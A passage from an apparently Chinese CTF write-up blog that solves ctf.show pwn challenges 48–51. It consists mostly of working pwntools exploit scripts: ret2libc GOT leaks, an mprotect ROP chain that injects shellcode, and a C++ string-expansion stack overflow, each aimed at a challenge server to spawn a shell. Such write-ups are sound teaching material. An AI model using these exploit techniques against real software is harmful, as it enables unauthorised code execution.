data-num=\"11\"></td><td><pre>puts_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>puts_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>main_add<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#system=e.sym[\"system\"]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#rdi_ret=0x00000000004007f3</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6b</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main_add<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"O.o?\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">#puts=u64(p.recv(6).ljust(8,b'\\x00'))</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>puts<span class=\"token operator\">=</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">,</span>puts<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>libc_base<span class=\"token operator\">=</span>puts<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"O.o?\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6b</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main_add<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn49mprotect函数\"><a class=\"anchor\" href=\"#pwn49mprotect函数\">#</a> pwn49 (mprotect 函数)</h1>\n<p>有 <code>mprotect</code>  函数可以改变内存的读写权限</p>\n<p>mprotect (起始地址，修改内存长度，修改的权限（修改为 7）)，起始地址必须包含整个页（4k，起始地址末尾为 000）</p>\n<p>静态编译一般 ida 旁边会有许多函数</p>\n<h2 id=\"题目-3\"><a class=\"anchor\" href=\"#题目-3\">#</a> 题目</h2>\n<p><code>静态编译？或许你可以找找mprotect函数</code></p>\n<p>32 位程序</p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    Canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n</code></pre>\n<p>【这里起始没有开启 canary，checksec 旧版本会认为有 <code>__stack_chk_fali_loacl</code>  函数就开启了 <code>canary</code> 】</p>\n<p>因此这里首先利用 mprotect 修改执行权限（修改范围要包含整个页），然后通过 read 函数来将 shellcode 写入到修改权限的地址</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn43')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28138</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>bbs<span class=\"token operator\">=</span><span class=\"token number\">0x804B060</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>read<span class=\"token operator\">=</span><span class=\"token number\">0x806BEE0</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>mprotect<span class=\"token operator\">=</span><span class=\"token number\">0x806CDD0</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>traget_add<span class=\"token operator\">=</span><span class=\"token number\">0x80DA000</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>size<span class=\"token operator\">=</span><span class=\"token number\">0x1000</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>chmod<span class=\"token operator\">=</span><span class=\"token number\">0x7</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>main<span class=\"token operator\">=</span><span class=\"token number\">0x8048A19</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>pop_esi_edi_ebx_ret<span class=\"token operator\">=</span><span class=\"token number\">0x08069cbd</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>sh<span class=\"token operator\">=</span><span class=\"token number\">0x80487BA</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Use mprotect func do sth!                               \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>shellcode<span class=\"token operator\">=</span>asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>payload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x12</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>mprotect<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>pop_esi_edi_ebx_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>traget_add<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>chmod<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Use mprotect func do sth!                               \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"    * *************************************                           \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x12</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>read<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>traget_add<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>traget_add<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x1000</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn50ret2libc也可以用mprotect\"><a class=\"anchor\" href=\"#pwn50ret2libc也可以用mprotect\">#</a> pwn50（ret2libc，也可以用 <code>mprotect</code> ）</h1>\n<h2 id=\"题目-4\"><a class=\"anchor\" href=\"#题目-4\">#</a> 题目</h2>\n<p>题目描述： <code>好像哪里不一样了 远程libc环境 Ubuntu 18</code></p>\n<p>源码：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> v1<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-20h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello CTFshow\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里可以进行溢出，直接利用 <code>ret2libc</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn50')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn50'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#libc=ELF(\"./64libc.so.6\")</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28117</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>puts_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>puts_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>main_add<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#system=e.sym[\"system\"]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rdi_ret<span class=\"token operator\">=</span><span class=\"token number\">0x00000000004007e3</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ret<span class=\"token operator\">=</span><span class=\"token number\">0x00000000004004fe</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">#payload=b\"a\"*(0x20+8)+p64(ret)+p64(rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_add)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>main_add<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello CTFshow\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>puts<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"puts:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">,</span>puts<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc_base<span class=\"token operator\">=</span>puts<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_base:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#log.info(\"libc_base:\"+hex(libc_base))</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"system:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"binsh:\"</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello CTFshow\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn51c程序\"><a class=\"anchor\" href=\"#pwn51c程序\">#</a> pwn51（c++ 程序）</h1>\n<h2 id=\"题目-5\"><a class=\"anchor\" href=\"#题目-5\">#</a> 题目：</h2>\n<p>题目内容： <code>I‘m IronMan</code></p>\n<p>32 位程序，保护：</p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n</code></pre>\n<p>源码为 c++ 编写的，有一大堆模板类</p>\n<pre><code class=\"language-c++\">int sub_8049059()\n&#123;\n  int v0; // eax\n  int v1; // eax\n  unsigned int v2; // eax\n  int v3; // eax\n  const char *v4; // eax\n  int v6; // [esp-Ch] [ebp-84h]\n  int v7; // [esp-8h] [ebp-80h]\n  char v8[12]; // [esp+0h] [ebp-78h] BYREF\n  char s[32]; // [esp+Ch] [ebp-6Ch] BYREF\n  char v10[24]; // [esp+2Ch] [ebp-4Ch] BYREF\n  char v11[24]; // [esp+44h] [ebp-34h] BYREF\n  unsigned int i; // [esp+5Ch] [ebp-1Ch]\n\n  memset(s, 0, sizeof(s));\n  puts(&quot;Who are you?&quot;);\n  read(0, s, 0x20u);\n  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator=(&amp;unk_804D0A0, &amp;unk_804A350);\n  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(&amp;unk_804D0A0, s);\n  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(v10, &amp;unk_804D0B8);\n  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(v11, &amp;unk_804D0A0);\n  sub_8048F06(v8);\n  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v11, v11, v10);\n  std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(v10, v6, v7);\n  if ( sub_80496D6(v8) &gt; 1u )\n  &#123;\n    std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator=(&amp;unk_804D0A0, &amp;unk_804A350);\n    v0 = sub_8049700(v8, 0);\n    if ( (unsigned __int8)sub_8049722(v0, &amp;unk_804A350) )\n    &#123;\n      v1 = sub_8049700(v8, 0);\n      std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(&amp;unk_804D0A0, v1);\n    &#125;\n    for ( i = 1; ; ++i )\n    &#123;\n      v2 = sub_80496D6(v8);\n      if ( v2 &lt;= i )\n        break;\n      std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(&amp;unk_804D0A0, &quot;IronMan&quot;);\n      v3 = sub_8049700(v8, i);\n      std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator+=(&amp;unk_804D0A0, v3);\n    &#125;\n  &#125;\n  v4 = (const char *)std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::c_str(&amp;unk_804D0A0);\n  strcpy(s, v4);\n  printf(&quot;Wow!you are:%s&quot;, s);\n  return sub_8049616(v8);\n&#125;\n\n</code></pre>\n<p>看的我很麻，根据 wp 上，功能就是将字母  <code>I</code>  转变为  <code>IronMan</code> ，然后再复制到 <code>s</code>  中</p>\n<p>有 system ( <code>cat /ctfshow_flag</code> ) 函数</p>\n<p>这里我们就能够通过输入一个字节的 I 变成七个字节的  <code>IronMan</code>  这样就算限制了输入的大小 (0x20) 个字节，也仍然可以溢出</p>\n<p>我们想要溢出（108+4 的字节然后再返回到 <code>system</code>  + 返回地址 + 参数）总共 120 字节，后面的 system 这些无法改变 (12 字节)，只好再前面将 I 转化成 IronMan（112/7=16）, 前面输入 16 个 I 即可，这些加起来总共 28 字节，而我们可以输入 32 字节（0x20）所以可以做到溢出</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./pwn51')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28212</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>system<span class=\"token operator\">=</span><span class=\"token number\">0x804902E</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>system_flag<span class=\"token operator\">=</span><span class=\"token number\">0x804902E</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>pop_edi<span class=\"token operator\">=</span><span class=\"token 